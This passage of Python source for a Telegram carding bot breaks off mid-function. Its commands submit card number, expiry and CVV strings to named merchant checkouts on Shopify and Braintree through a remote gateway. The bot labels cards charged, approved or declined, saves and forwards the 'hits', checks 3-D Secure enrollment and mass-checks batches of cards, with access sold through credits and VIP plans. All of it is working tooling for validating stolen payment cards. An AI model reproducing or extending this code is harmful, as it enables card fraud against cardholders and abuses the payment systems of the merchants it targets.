            await save_approved_card(card, "APPROVED", res.get('Response'), res.get('Gateway'), res.get('Price'))
            # Forward to Hits Group only for INCORRECT_ZIP responses
            if "incorrect_zip" in response_text:
                await forward_to_hits_group(card, res.get('Response'), res.get('Gateway'), res.get('Price'), site_index, event.sender_id, "sh")
        else:
            status_header = "~~ 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ~~ ❌"
            status_result = "Declined"
        
        # Determine status text
        if "𝘾𝙃𝘼𝙍𝙂𝙀𝘿" in status_header:
            status_display = "`Charged 💎`"
        elif "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿" in status_header:
            status_display = "APPROVED ✅"
        elif "𝘾𝙇𝙊𝙐𝘿𝙁𝙇𝘼𝙍𝙀" in status_header:
            status_display = "CLOUDFLARE ⚠️"
        elif "𝙎𝙄𝙏𝙀 𝘿𝙀𝘼𝘿" in status_header:
            status_display = "SITE DEAD ⚠️"
        elif "𝙎𝙄𝙏𝙀 𝙀𝙍𝙍𝙊𝙍" in status_header:
            status_display = "SITE ERROR ⚠️"
        elif "𝘼𝙋𝙄 𝙀𝙍𝙍𝙊𝙍" in status_header:
            status_display = "API ERROR ⚠️"
        else:
            status_display = "Declined ❌"
        
        # Clean format with bold labels
        msg = f"""```
✦ [$sh] [ #Auto_Shopify ]
```**CC**: `{card}`
**Status**: {status_display}
**Response**: {res.get('Response')}
**Price** → {res.get('Price')} 💸
**Site** → {site_index}
**Gateway** → {res.get('Gateway')}

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country.upper()} {flag}

Elapsed time: {elapsed_time} seconds"""
        # Delete loading message and send new result message
        if loading_msg:
            await loading_msg.delete()
        result_msg = await event.reply(msg, parse_mode='Markdown', link_preview=False)
        if "thank you" in response_text or "payment successful" in response_text: await pin_charged_message(event, result_msg)
    except Exception as e:
        loading_task.cancel()
        if loading_msg:
            await loading_msg.delete()
        await event.reply(f"❌ Error: {e}", link_preview=False)

@client.on(events.NewMessage(pattern=r'(?i)^[/.]lol'))
@require_membership
async def lol(event):
    """Gateway checker for fowers-games.myshopify.com"""
    # Check group authorization
    if not await check_group_authorization(event):
        return
    
    # Check if command is enabled
    if not is_command_enabled("lol"):
        return await event.reply("⚠️ This command is currently disabled by admin.", link_preview=False)
    
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": 
        return await event.reply(banned_user_message(), link_preview=False)
    if not can_access:
        buttons = [[Button.url("🚀 Join Group", "https://t.me/+zsDNOaFO-_tlZjA1")]]
        return await event.reply("❌ Insufficient Credits!\n\n(Free check available in group)", buttons=buttons, link_preview=False)
    
    # Check cooldown (10 seconds per user)
    user_id = event.sender_id
    current_time = time.time()
    
    if user_id in LOL_COOLDOWNS:
        time_since_last = current_time - LOL_COOLDOWNS[user_id]
        if time_since_last < 10:
            remaining = int(10 - time_since_last)
            return await event.reply(f"⏳𝘼𝙣𝙩𝙞-𝙎𝙥𝙖𝙢 𝘼𝙡𝙚𝙧𝙩: 𝙔𝙤𝙪 𝙘𝙖𝙣 𝙧𝙚𝙩𝙧𝙮 𝙖𝙛𝙩𝙚𝙧 {remaining} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨.🚫", link_preview=False)
    
    # Update cooldown
    LOL_COOLDOWNS[user_id] = current_time
    
    # Extract card
    card = None
    if event.reply_to_msg_id:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.text:
            card = extract_card(replied_msg.text)
    else:
        card = extract_card(event.raw_text)
    
    if not card:
        return await event.reply("Format: /lol 4111111111111111|12|2025|123\n\n𝙊𝙧 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙘𝙤𝙣𝙩𝙖𝙞𝙣𝙞𝙣𝙜 𝙘𝙖𝙧𝙙", link_preview=False)
    
    # Check and deduct 1 credit (skip for admin and authorized groups)
    if user_id not in ADMIN_ID:
        # Normalize chat_id for credit check
        check_chat_id = event.chat.id
        if check_chat_id > 0:
            check_chat_id = int(f"-100{check_chat_id}")
        
        if not await check_credits_and_notify(user_id, 1, check_chat_id):
            return await event.reply("❌ Insufficient Credits!\n\n(Free check available in group)", link_preview=False)
        
        success, remaining = await deduct_user_credits(user_id, 1, "/lol", event.chat_id)
        if not success:
            return await event.reply("❌ **Credit deduction failed!**\n\n💡 Use /balance to check your credits", link_preview=False)
    
    # Loading animation like /sh
    start_time = time.time()
    
    # Show initial loading message
    loading_msg = await event.reply(f"""- **CC**: `{card}`
- **Gateway** → Shopify low charge $
- **Response**: ■""", parse_mode="Markdown", link_preview=False)
    
    async def animate_loading():
        loading_states = ["■", "■■", "■■■", "■■■■"]
        i = 1
        while True:
            try:
                current_msg = f"""- **CC**: `{card}`
- **Gateway** → Shopify low charge $
- **Response**: {loading_states[i % 4]}"""
                await loading_msg.edit(current_msg, parse_mode="Markdown")
                i += 1
                await asyncio.sleep(0.4)
            except asyncio.CancelledError:
                break
            except Exception as e:
                with open("debug.log", "a") as f:
                    f.write(f"[LOL ANIMATION ERROR] {e}\n")
                break
    
    loading_task = asyncio.create_task(animate_loading())
    
    try:
        # Use your gateway (ensures correct site)
        import os
        GATEWAY_URL = os.environ.get("GATEWAY_URL", "https://gateway-production-ba63.up.railway.app")
        
        print(f"[LOL] Using gateway: {GATEWAY_URL}")
        
        # Test gateway health first
        try:
            health_check = requests.get(f"{GATEWAY_URL}/health", timeout=5)
            print(f"[LOL] Gateway health: {health_check.status_code}")
        except Exception as health_err:
            print(f"[LOL] Gateway health check failed: {health_err}")
        
        # Run in executor to not block animation
        loop = asyncio.get_event_loop()
        response = await loop.run_in_executor(
            None,
            lambda: requests.post(
                f"{GATEWAY_URL}/check",
                json={"card": card, "site": "https://fowers-games.myshopify.com"},
                timeout=120
            )
        )
        
        loading_task.cancel()
        try:
            await loading_task
        except asyncio.CancelledError:
            pass
        elapsed_time = round(time.time() - start_time, 2)
        
        if response.status_code == 200:
            result = response.json()
            
            # Convert gateway response format to match expected format
            result = {
                "Response": result.get("response", "Card Declined"),
                "Gateway": result.get("gateway", "Shopify Payments"),
                "Price": result.get("price", "-")
            }
        else:
            result = {"Response": "Gateway Error", "Gateway": "Shopify", "Price": "-"}
        
        if result:
            
            # Get BIN info
            brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
            
            # Get user info
            try:
                user = await client.get_entity(event.sender_id)
                username = user.first_name if user.first_name else "User"
                user_username = user.username if user.username else None
                if user_username:
                    user_link = f"[{username}](https://t.me/{user_username})"
                else:
                    user_link = username
            except:
                user_link = "User"
            
            # Get user plan for label
            user_data = await get_user_credits(event.sender_id)
            plan = user_data.get('plan', 'Free')
            if plan == "VIP":
                access_label = "VIP 💎"
            elif plan == "VIP":
                access_label = "VIP 💎"
            else:
                access_label = "Free 🆓"
            
            # Parse response like /sh
            response_text = result.get("Response", "").lower()
            original_response = result.get("Response", "Card Declined")
            
            # Handle site errors first
            if "py id empty" in response_text or "product id is empty" in response_text:
                result["Response"] = "Site Dead - Product not found. Use /check"
                original_response = "Site Dead - Product not found. Use /check"
            
            # Handle r4 token empty, hcaptcha, and amount errors
            elif any(err in response_text for err in ["r4 token empty", "r4 token is empty", "hcaptcha detected", "hcaptcha", "del ammount empty", "del amount empty"]):
                result["Response"] = "INCORRECT_NUMBER"
                original_response = "INCORRECT_NUMBER"
                response_text = "incorrect_number"
            
            # Determine status header
            if "thank you" in response_text or "payment successful" in response_text:
                status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
                status_display = "`Charged 💎`"
                await save_approved_card(card, "CHARGED", original_response, result.get("Gateway", "Shopify"), result.get("Price", "0.99"))
            elif any(key in response_text for key in ["invalid_cvv", "incorrect_cvv", "insufficient_funds", "approved", "incorrect_zip", "insufficient funds"]):
                status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
                status_display = "APPROVED ✅"
                await save_approved_card(card, "APPROVED", original_response, result.get("Gateway", "Shopify"), result.get("Price", "0.99"))
            else:
                status_header = "~~ 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ~~ ❌"
                status_display = "Declined ❌"
            
            # Format message exactly like /psh
            price_display = result.get('Price', '-')
            gateway_display = result.get('Gateway', 'Shopify Payments')
            
            # Dynamic header based on price and status
            if price_display != "-":
                header_tag = f"#Shopify_{price_display}$"
            else:
                header_tag = "#Shopify_low_charge$"
            
            msg = f"""```
✦ [/lol] [ {header_tag} ]
```**CC**: `{card}`
**Status**: {status_display}
**Response**: {original_response}
**Price** → {price_display} 💸
**Gateway** → {gateway_display}

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country.upper()} {flag}

Elapsed time: {elapsed_time} seconds"""
            
            if loading_msg:
                await loading_msg.delete()
            result_msg = await event.reply(msg, parse_mode='Markdown', link_preview=False)
            
            # Pin if charged
            if "𝘾𝙃𝘼𝙍𝙂𝙀𝘿" in status_header:
                await pin_charged_message(event, result_msg)
            
            # Forward hits to log channel
            print(f"DEBUG: status_header = {status_header}")  # Debug
            if "𝘾𝙃𝘼𝙍𝙂𝙀𝘿" in status_header or "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿" in status_header:
                print("DEBUG: Hit detected, forwarding...")  # Debug
                try:
                    FORWARD_CHAT_ID = -1003005249371  # Same as main bot FORWARD_ID
                    
                    # Get user info
                    try:
                        user = await client.get_entity(event.sender_id)
                        user_name = user.first_name if user.first_name else "User"
                        user_username = f"@{user.username}" if user.username else "No username"
                    except:
                        user_name = "User"
                        user_username = "No username"
                    
                    hit_msg = f"""```
✦ [/lol] [ #Shopify_6.5$ ]
```**CC**: `{card}`
**Status**: {status_display}
**Response**: {original_response}
**Price** → {price_display} 💸
**Gateway** → {gateway_display}

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country.upper()} {flag}
👤 User: {user_name} ({user_username})
🆔 User ID: {event.sender_id}"""
                    
                    await client.send_message(FORWARD_CHAT_ID, hit_msg, parse_mode='Markdown', link_preview=False)
                except Exception as e:
                    print(f"Hit forward error: {e}")
            
    except requests.exceptions.Timeout:
        loading_task.cancel()
        if loading_msg:
            await loading_msg.delete()
        await event.reply("❌ Gateway timeout. Please try again.", link_preview=False)
    except requests.exceptions.ConnectionError as e:
        loading_task.cancel()
        if loading_msg:
            await loading_msg.delete()
        print(f"Gateway connection error: {e}")
        await event.reply(f"❌ Cannot connect to gateway.\n\nGateway URL: {GATEWAY_URL}\nError: Connection refused", link_preview=False)
    except Exception as e:
        try:
            loading_task.cancel()
        except:
            pass
        if loading_msg:
            try:
                await loading_msg.delete()
            except:
                pass
        await event.reply(f"❌ Error: {e}", link_preview=False)

@client.on(events.NewMessage(pattern=r'(?i)^[/.]vbv'))
@require_membership
async def vbv_command(event):
    """VBV Checker - Check if card has 3D Secure"""
    # Check group authorization
    if not await check_group_authorization(event):
        return
    
    # Check if command is enabled
    if not is_command_enabled("vbv"):
        return await event.reply("⚠️ This command is currently disabled by admin.", link_preview=False)
    
    # Check access
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned":
        return await event.reply(banned_user_message(), link_preview=False)
    if not can_access:
        buttons = [[Button.url("🚀 Join Group", "https://t.me/+zsDNOaFO-_tlZjA1")]]
        return await event.reply("❌ Insufficient Credits!\n\n(Free check available in group)", buttons=buttons, link_preview=False)
    
    # Extract card
    card = None
    if event.reply_to_msg_id:
        replied_msg = await event.get_reply_message()
        card = extract_card(replied_msg.text)
    else:
        card = extract_card(event.raw_text)
    
    if not card:
        return await event.reply("𝙁𝙤𝙧𝙢𝙚𝙩 ➜ /vbv 4111111111111111|12|2025|123\n\n𝙊𝙧 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙘𝙤𝙣𝙩𝙖𝙞𝙣𝙞𝙣𝙜 𝙘𝙖𝙧𝙙 𝙙𝙚𝙩𝙖𝙞𝙡𝙨", link_preview=False)
    
    # Show processing message
    start_time = time.time()
    loading_msg = await event.reply("Processing...", link_preview=False)
    
    try:
        # Check card VBV status
        res = await check_vbv_gateway(card, event.sender_id)
        
        elapsed_time = round(time.time() - start_time, 2)
        
        # Get BIN info for additional details
        bin_info = await lookup_bin(card.split('|')[0])
        card_level = bin_info.get('tier', 'UNKNOWN').upper()
        country_name = bin_info.get('country', 'UNKNOWN')
        country_flag = bin_info.get('flag', '🏳️')
        
        # Get response and determine status
        response_text = res.get('Response', '').lower()
        card_type_from_res = res.get('Type', 'UNKNOWN').upper()
        vbv_value = res.get('VBV', '').lower()
        status_value = res.get('Status', '').lower()
        
        # Determine VBV status based on new response format
        if 'enrolled' in vbv_value or 'enrolled' in response_text:
            status_display = "VBV ENROLLED ✅"
            response_msg = "VBV Enrolled - 3D Secure Required"
        elif 'safekey' in vbv_value or 'safekey' in response_text:
            status_display = "SAFEKEY ✅"
            response_msg = "American Express SafeKey"
        elif 'protectbuy' in vbv_value or 'protectbuy' in response_text:
            status_display = "PROTECTBUY ✅"
            response_msg = "Discover ProtectBuy"
        elif 'unknown' in vbv_value or 'unknown' in response_text:
            status_display = "UNKNOWN ⚠️"
            response_msg = "VBV Status Unknown"
        elif 'authenticate_successful' in response_text or 'authenticate successful' in response_text:
            status_display = "NON VBV ✅"
            response_msg = "authenticate_successful"
        elif 'challenge_required' in response_text or 'challenge required' in response_text:
            status_display = "VBV ❌"
            response_msg = "challenge_required"
        elif 'invalid' in response_text or 'luhn' in response_text:
            status_display = "INVALID ❌"
            response_msg = response_text
        elif 'error' in status_value:
            status_display = "ERROR ⚠️"
            response_msg = response_text if response_text else "unknown_error"
        elif 'success' in status_value:
            # Success status from new implementation
            status_display = "VBV ENROLLED ✅"
            response_msg = response_text if response_text else "VBV Check Complete"
        else:
            # Fallback
            status_display = "UNKNOWN ⚠️"
            response_msg = response_text if response_text else "unknown_error"
        
        # Format message with bold formatting
        msg = f"""VBV LOOKUP 

CC: `{card}`
Status: {status_display}
Response: {response_msg}

Type: **{card_type_from_res}**
Level: **{card_level}**
Country: **{country_name} {country_flag}**
Bank: **{res.get('Bank', 'UNKNOWN')}**

Took: **{elapsed_time}s**"""
        
        # Edit loading message with final result
        try:
            await loading_msg.edit(msg, parse_mode='Markdown', link_preview=False)
        except:
            try:
                await event.reply(msg, parse_mode='Markdown', link_preview=False)
            except:
                await event.reply(msg, link_preview=False)
            
    except Exception as e:
        if loading_msg:
            try:
                await loading_msg.edit(f"❌ Error: {e}")
            except:
                await event.reply(f"❌ Error: {e}", link_preview=False)
        else:
            await event.reply(f"❌ Error: {e}", link_preview=False)


@client.on(events.NewMessage(pattern=r'(?i)[/.]bt'))
@require_membership
async def bt_command(event):
    """Braintree Gateway - iditarod.com"""
    # Check group authorization
    if not await check_group_authorization(event):
        return
    
    # Check if command is enabled
    if not is_command_enabled("bt"):
        return await event.reply("⚠️ This command is currently disabled by admin.", link_preview=False)
    
    # Antispam: Check command cooldown (25 seconds per user)
    user_id = event.sender_id
    current_time = time.time()
    
    if user_id in BT_COMMAND_COOLDOWN:
        time_since_last = current_time - BT_COMMAND_COOLDOWN[user_id]
        if time_since_last < 25:
            remaining = int(25 - time_since_last)
            return await event.reply(f"⏳**Anti-Spam Alert: You can retry after {remaining} seconds.**🚫", link_preview=False)
    
    # Update cooldown timestamp
    BT_COMMAND_COOLDOWN[user_id] = current_time
    
    # Check if in auth group (GROUP_ID) - free access for all
    if event.chat_id == GROUP_ID:
        pass  # Free access in auth group
    else:
        # Outside auth group - VIP only
        user_data = await get_user_credits(event.sender_id)
        user_plan = user_data.get('plan', 'Free')
        
        if user_plan != 'VIP':
            buttons = [[Button.url("Use free in auth group ✅", "https://t.me/+zsDNOaFO-_tlZjA1")]]
            return await event.reply(
                "❌ **VIP Plan Required!**\n\n"
                "/bt command requires VIP plan.\n\n"
                "💎 Contact [𝘼𝙆](https://t.me/Akbhai007) to upgrade your plan!",
                buttons=buttons,
                link_preview=False
            )
    
    # Check access
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned":
        return await event.reply(banned_user_message(), link_preview=False)
    if not can_access:
        buttons = [[Button.url("🚀 Join Group", "https://t.me/+zsDNOaFO-_tlZjA1")]]
        return await event.reply("❌ Insufficient Credits!\n\n(Free check available in group)", buttons=buttons, link_preview=False)
    
    # Extract card from message
    card = None
    if event.reply_to_msg_id:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.text:
            card = extract_card(replied_msg.text)
    else:
        card = extract_card(event.raw_text)
    
    if not card:
        return await event.reply("Format ➜ /bt 4111111111111111|12|2025|123\n\nOr reply to a message containing card", link_preview=False)
    
    # Check if main group (free access)
    if event.chat_id == GROUP_ID:
        pass  # FREE
    else:
        # Check and deduct credits
        check_chat_id = event.chat.id
        if check_chat_id > 0:
            check_chat_id = int(f"-100{check_chat_id}")
        
        if not await check_credits_and_notify(event.sender_id, 1, check_chat_id):
            buttons = [[Button.url("🚀 Join Group", "https://t.me/+zsDNOaFO-_tlZjA1")]]
            return await event.reply("❌ Insufficient Credits!\n\n(Free check available in group)", buttons=buttons, link_preview=False)
    
    # Deduct 1 credit
    success, remaining = await deduct_user_credits(event.sender_id, 1, "/bt", event.chat_id)
    if not success:
        return await event.reply("❌ **Credit deduction failed!**\n\n💡 Use /balance to check your credits", link_preview=False)
    
    # Show processing message with animation
    loading_msg = None
    start_time = time.time()
    
    async def animate_loading():
        nonlocal loading_msg
        loading_states = ["■", "■■", "■■■", "■■■■"]
        i = 0
        while True:
            try:
                current_msg = f"""- **CC**: `{card}`
- **Gateway** → Braintree
- **Response**: {loading_states[i % 4]}"""
                if loading_msg is None:
                    loading_msg = await event.reply(current_msg, parse_mode="Markdown", link_preview=False)
                else:
                    await loading_msg.edit(current_msg, parse_mode="Markdown")
                await asyncio.sleep(0.4)
                i += 1
            except: break
    
    # Start animation
    loading_task = asyncio.create_task(animate_loading())
    
    try:
        # Execute Braintree check (inline function)
        response_data = await check_braintree_card(card)
        
        elapsed_time = round(time.time() - start_time, 2)
        
        # Get BIN info (using get_bin_info for consistency with other commands)
        brand, card_type, card_level, bank, country_name, country_flag = await get_bin_info(card.split('|')[0])
        
        # Determine status
        status_value = response_data.get('status', 'error').lower()
        response_msg = response_data.get('message', 'Unknown')
        
        # Antispam: Check if same error within 25 seconds
        user_id = event.sender_id
        current_time = time.time()
        
        if status_value in ['declined', 'error']:
            if user_id in BT_ERROR_CACHE:
                last_error = BT_ERROR_CACHE[user_id]
                time_diff = current_time - last_error['timestamp']
                
                # If same error within 25 seconds, show antispam message
                if last_error['error'] == response_msg and time_diff < 25:
                    loading_task.cancel()
                    try:
                        await loading_task
                    except asyncio.CancelledError:
                        pass
                    remaining = int(25 - time_diff)
                    await loading_msg.edit(f"⏳**Anti-Spam Alert: You can retry after {remaining} seconds.**🚫")
                    return
            
            # Update error cache
            BT_ERROR_CACHE[user_id] = {'error': response_msg, 'timestamp': current_time}
        else:
            # Clear cache on success
            if user_id in BT_ERROR_CACHE:
                del BT_ERROR_CACHE[user_id]
        
        if status_value == 'approved':
            status_display = "APPROVED ✅"
        elif status_value == 'declined':
            status_display = "DECLINED ❌"
        else:
            status_display = "ERROR ⚠️"
        
        # Get user info
        user_data = await get_user_credits(event.sender_id)
        plan = user_data.get('plan', 'Free')
        if plan == "VIP":
            access_label = "VIP 💎"
        elif plan == "VIP":
            access_label = "VIP 💎"
        else:
            access_label = "Free"
        
        try:
            user = await client.get_entity(event.sender_id)
            username = user.first_name if user.first_name else "User"
        except:
            username = "User"
        
        # Stop animation
        loading_task.cancel()
        try:
            await loading_task
        except asyncio.CancelledError:
            pass
        
        # Format message (same style as /st)
        msg = f"""```
✦ [/bt] [ #Braintree_Auth ]
```**CC**: `{card}`
**Status**: {status_display}
**Response**: {response_msg}
**Gateway** → Braintree

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {card_type} - {card_level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country_name.upper()} {country_flag}

Elapsed time: {elapsed_time} seconds"""
        
        try:
            await loading_msg.edit(msg, parse_mode='Markdown', link_preview=False)
        except:
            await loading_msg.edit(msg.replace('`', '').replace('*', ''))
        
    except asyncio.TimeoutError:
        loading_task.cancel()
        try:
            await loading_task
        except asyncio.CancelledError:
            pass
        await loading_msg.edit("❌ Gateway timeout (30s)")
    except Exception as e:
        loading_task.cancel()
        try:
            await loading_task
        except asyncio.CancelledError:
            pass
        await loading_msg.edit(f"❌ Error: {str(e)[:100]}")

@client.on(events.NewMessage(pattern=r'(?i)^[/.]msh'))
@require_membership
async def msh(event):
    # Check group authorization FIRST
    if not await check_group_authorization(event):
        return
    
    # Check if command is enabled
    if not is_command_enabled("msh"):
        return
    
    can_access, access_type = await can_use(event.sender_id, event.chat)
    print(f"[MSH] can_access={can_access}, access_type={access_type}")
    if access_type == "banned": return await event.reply(banned_user_message(), link_preview=False)
    if not can_access:
        print(f"[MSH] ❌ Access denied! can_access={can_access}")
        buttons = [[Button.url("🚀 Join Group", "https://t.me/+zsDNOaFO-_tlZjA1")]]
        return await event.reply("❌ Insufficient Credits!\n\n(Free check available in group)", buttons=buttons, link_preview=False)
    print(f"[MSH] ✅ Access granted! Proceeding with command...")
    
    # Check if user already has an active /msh process
    if event.sender_id in ACTIVE_MSH_PROCESSES:
        return await event.reply("⏳ Wait! Your previous /msh is still checking...", link_preview=False)
    
    cards = []
    if event.reply_to_msg_id:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.text: cards = extract_all_cards(replied_msg.text)
        if not cards: return await event.reply("❌ Couldn't extract valid cards from replied message\n\nFormat Example:\n/msh\n4111111111111111|12|2025|123\n4111111111111111|12|2025|123", link_preview=False)
    else:
        cards = extract_all_cards(event.raw_text)
    if not cards: return await event.reply("❌ Format Example:\n/msh\n4111111111111111|12|2025|123\n4111111111111111|12|2025|123\n4111111111111111|12|2025|123\n\nOr reply to a message containing multiple cards", link_preview=False)
    
    # Check mass checking limit for non-admin users
    if event.sender_id not in ADMIN_ID:
        if len(cards) > 15:
            return await event.reply("⚠️ Mass checking limit: 15 cards", link_preview=False)
    
    # Set limits based on user type and access level
    max_cards = get_cc_limit(access_type, event.sender_id)
    if event.sender_id in ADMIN_ID:
        limit_msg = f"{max_cards} cards for /𝙢𝙨𝙝 (Admin)"
    elif access_type in ["premium_private", "premium_group", "vip_private", "vip_group"]:
        limit_msg = f"{max_cards} cards for /𝙢𝙨𝙝 (Premium/VIP)"
    elif access_type == "group_free":
        limit_msg = f"{max_cards} cards for /𝙢𝙨𝙝 (Group Free)"
    else:
        limit_msg = f"{max_cards} cards for /𝙢𝙨𝙝"
    
    if len(cards) > max_cards and max_cards > 0:
        total_found = len(cards)
        cards = cards[:max_cards]
        await event.reply(f"``` ⚠️ 𝙊𝙣𝙡𝙮 𝙘𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙛𝙞𝙧𝙨𝙩 {max_cards} 𝙘𝙖𝙧𝙙𝙨 𝙤𝙪𝙩 𝙤𝙛 {total_found} 𝙥𝙧𝙤𝙫𝙞𝙙𝙚𝙙. 𝙇𝙞𝙢𝙞𝙩 𝙞𝙨 {limit_msg}.```", link_preview=False)
    # Check if user has enough credits (skip for admin and authorized groups)
    if event.sender_id not in ADMIN_ID and access_type not in ["main_group_free", "premium_group_free"]:
        user_data = await get_user_credits(event.sender_id)
        available_credits = user_data.get('credits', 0)
        required_credits = len(cards)
        
        print(f"[MSH] Credit check: available={available_credits}, required={required_credits}")
        
        if available_credits < required_credits:
            print(f"[MSH] ❌ Insufficient credits! Blocking command.")
            return await event.reply(
                f"❌ Insufficient Credits!\n\n(Free check available in group)"
            , link_preview=False)
        
        print(f"[MSH] ✅ Sufficient credits, proceeding...")
    
    sites = await load_json(SITE_FILE)
    user_sites = sites.get(str(event.sender_id), [])
    if not user_sites: return await event.reply("𝙔𝙤𝙪 𝙝𝙖𝙫𝙚𝙣'𝙩 𝙖𝙙𝙙𝙚𝙙 𝙖𝙣𝙮 𝙐𝙍𝙇. 𝙁𝙞𝙧𝙨𝙩 𝙖𝙙𝙙 𝙪𝙨𝙞𝙣𝙜 /add", link_preview=False)
    
    asyncio.create_task(process_msh_cards(event, cards, user_sites))

async def process_msh_cards(event, cards, sites):
    user_id = event.sender_id
    
    # Mark process as active
    ACTIVE_MSH_PROCESSES[user_id] = True
    
    try:
        start_total_time = time.time()
        sent_msg = None
        cards_per_site = 2
        current_site_index = 0
        cards_on_current_site = 0
        
        all_results = []
        
        # Get user info for header
        try:
            user = await client.get_entity(event.sender_id)
            username = user.first_name if user.first_name else "User"
            user_username = user.username if user.username else None
            if user_username:
                user_link = f"[{username}](https://t.me/{user_username})"
            else:
                user_link = username
        except:
            username = "User"
            user_link = username
        
        # Get user plan for label
        user_data = await get_user_credits(event.sender_id)
        plan = user_data.get('plan', 'Free')
        if plan == "VIP":
            access_label = "VIP 💎"
        elif plan == "VIP":
            access_label = "VIP 💎"
        else:
            access_label = "Free 🆓"
        
        # Show loading animation and keep the message for updates
        sent_msg = await show_loading_animation(event)
        
        # Create tasks for parallel processing
        tasks = []
        task_info = []
        for idx, card in enumerate(cards):
            current_site = sites[current_site_index]
            site_idx = current_site_index
            
            task = asyncio.create_task(check_card_specific_site(card, current_site))
            tasks.append(task)
            task_info.append((card, site_idx, current_site))
            
            cards_on_current_site += 1
            if cards_on_current_site >= cards_per_site:
                current_site_index = (current_site_index + 1) % len(sites)
                cards_on_current_site = 0
        
        # Process results as they complete - one by one
        completed_count = 0
        pending = {task: info for task, info in zip(tasks, task_info)}
        
        while pending:
            done, _ = await asyncio.wait(pending.keys(), return_when=asyncio.FIRST_COMPLETED)
            
            for task in done:
                card, site_idx, site_used = pending.pop(task)
                
                try:
                    result = task.result()
                except Exception as e:
                    result = {"Response": f"Exception: {str(e)}", "Price": "-", "Gateway": "-"}
                
                if isinstance(result, Exception):
                    result = {"Response": f"Exception: {str(result)}", "Price": "-", "Gateway": "-"}
                
                # Get BIN info
                brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
                response_text = result.get("Response", "").lower()
                original_response = result.get("Response", "")
                
                # Handle r4 token empty, hcaptcha, and amount errors
                if any(err in response_text for err in ["r4 token empty", "r4 token is empty", "hcaptcha detected", "hcaptcha", "del ammount empty", "del amount empty"]):
                    result["Response"] = "INCORRECT_NUMBER"
                    original_response = "INCORRECT_NUMBER"
                    response_text = "incorrect_number"
                
                # Handle 3D CC responses
                if "3d" in response_text:
                    original_response = "3DS Authentications Required"
                    result["Response"] = original_response
                
                # Determine status
                if "cloudflare bypass failed" in response_text:
                    status_display = "CLOUDFLARE ⚠️"
                elif "thank you" in response_text or "payment successful" in response_text:
                    status_display = "`Charged 💎`"
                    await save_approved_card(card, "CHARGED", result.get('Response'), result.get('Gateway'), result.get('Price'))
                    await forward_to_hits_group(card, result.get('Response'), result.get('Gateway'), result.get('Price'), site_idx + 1, event.sender_id, "msh")
                elif any(key in response_text for key in ["invalid_cvv", "incorrect_cvv", "insufficient_funds", "approved", "success", "invalid_cvc", "incorrect_cvc", "incorrect_zip", "insufficient funds"]):
                    status_display = "APPROVED ✅"
                    await save_approved_card(card, "APPROVED", result.get('Response'), result.get('Gateway'), result.get('Price'))
                    if "incorrect_zip" in response_text:
                        await forward_to_hits_group(card, result.get('Response'), result.get('Gateway'), result.get('Price'), site_idx + 1, event.sender_id, "msh")
                elif "3d" in response_text:
                    status_display = "Declined ❌"
                else:
                    status_display = "Declined ❌"
                
                # Store result
                all_results.append({
                    'card': card,
                    'status': status_display,
                    'response': result.get('Response'),
                    'price': result.get('Price'),
                    'site': site_idx + 1
                })
                
                completed_count += 1
                
                # Deduct 1 credit for each CC checked (skip for admin)
                if user_id not in ADMIN_ID:
                    success, remaining = await deduct_user_credits(user_id, 1, "/msh", event.chat_id)
                    if not success:
                        # If credit deduction fails, stop processing
                        print(f"[MSH] Credit deduction failed for user {user_id}, stopping...")
                        break
                
                # Update message with current results
                current_msg = f"```\n✦ [$msh] [ #Auto_Shopify ]\n```"
                if event.sender_id in ADMIN_ID:
                    current_msg += f"**$msh limit {len(cards)}/50** - Checked: {completed_count}/{len(cards)}\n"
                else:
                    current_msg += f"**$msh limit {len(cards)}/15** - Checked: {completed_count}/{len(cards)}\n"
                current_msg += f"━ ━ ━ ━ ━ ━━━ ━ ━ ━ ━ ━\n"
                
                for r in all_results:
                    current_msg += f"• **CC**: `{r['card']}`\n"
                    current_msg += f"• **Status**: {r['status']}\n"
                    current_msg += f"• **Result**: {r['response']}\n"
                    current_msg += f"━ ━ ━ ━ ━ ━━━ ━ ━ ━ ━ ━\n"
                
                # Add footer if all complete
                if completed_count == len(cards):
                    total_elapsed = round(time.time() - start_total_time, 2)
                    current_msg += f"**[⚬] T/t** : {total_elapsed}s\n"
                    current_msg += f"**[⚬] Checked By** : {user_link} [{access_label}]\n"
                    current_msg += f"**[⚬] Dev** : [𝘼𝙆](https://t.me/Akbhai007)"
                
                # Edit message
                try:
                    await sent_msg.edit(current_msg, parse_mode='Markdown', link_preview=False)
                except:
                    pass
                
                # Small delay to avoid flood limits
                if completed_count < len(cards):
                    await asyncio.sleep(0.3)
        
    finally:
        # Remove process lock
